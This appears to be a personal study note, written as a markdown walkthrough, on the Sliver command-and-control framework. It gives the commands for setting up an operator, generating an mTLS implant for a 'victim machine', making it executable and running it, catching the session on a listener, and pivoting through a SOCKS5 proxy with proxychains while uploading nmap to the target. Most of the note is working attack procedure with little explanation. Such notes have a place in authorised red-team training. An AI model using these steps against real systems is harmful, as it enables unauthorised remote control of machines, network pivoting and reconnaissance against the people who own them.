./sliver-server linux to start
  
```Markdown
new-operator --name <name> --lhost localhost
```
- name could just be the name of the machine
![image 62.png](assets/Sliver/image%2062.png)
- creates a config file
  
multiplayer
![image 1 31.png](assets/Sliver/image%201%2031.png)
  
using config file from earlier, run
```Markdown
./sliver-client import <name_of_config_file>
```
- choose computer
![image 2 31.png](assets/Sliver/image%202%2031.png)
  
should get a confirmation that the system has joined
![image 3 26.png](assets/Sliver/image%203%2026.png)
  
in the silver client window, type the following to create a binary for victim machine to connect
```Markdown
generate --mtls <IP> --os <operating_system> --arch <architecture> --skip-symbols --save <save_location> --name <name>
```
![image 4 23.png](assets/Sliver/image%204%2023.png)
  
transfer the file created over to the victim machine
- in this example, it’s “heron_linyt”
![image 5 22.png](assets/Sliver/image%205%2022.png)
  
chmod 777 <file_name>
![image 6 18.png](assets/Sliver/image%206%2018.png)
  
  
go back to sliver window and type “mtls” to start listener
![image 7 17.png](assets/Sliver/image%207%2017.png)
  
  
```Markdown
./<file_name
```
![image 8 15.png](assets/Sliver/image%208%2015.png)
  
  
type “use <code>”
- code is shown from the output “session <code_head> started…”
- so maybe just type the beginning then tab?
- example of head in this is “35d2fe25”
![image 9 15.png](assets/Sliver/image%209%2015.png)
  
change proxychains config to
- socks5 127.0.0.1 1081
![image 10 11.png](assets/Sliver/image%2010%2011.png)
  
type “socks5 start” in the rev shell
![image 11 11.png](assets/Sliver/image%2011%2011.png)
- can now run proxychains since sliver does a tunnel for you
![image 12 8.png](assets/Sliver/image%2012%208.png)
  
doing nmap through proxychains is really slow, but in sliver’s C2, you can use the “upload command”
- upload nmap
![image 13 8.png](assets/Sliver/image%2013%208.png)
- nmap was in his current directory
  
![image 14 8.png](assets/Sliver/image%2014%208.png)
  
using proxychains with sliver
- just set the port to 1081 and use SOCKS5
![image 15 7.png](assets/Sliver/image%2015%207.png)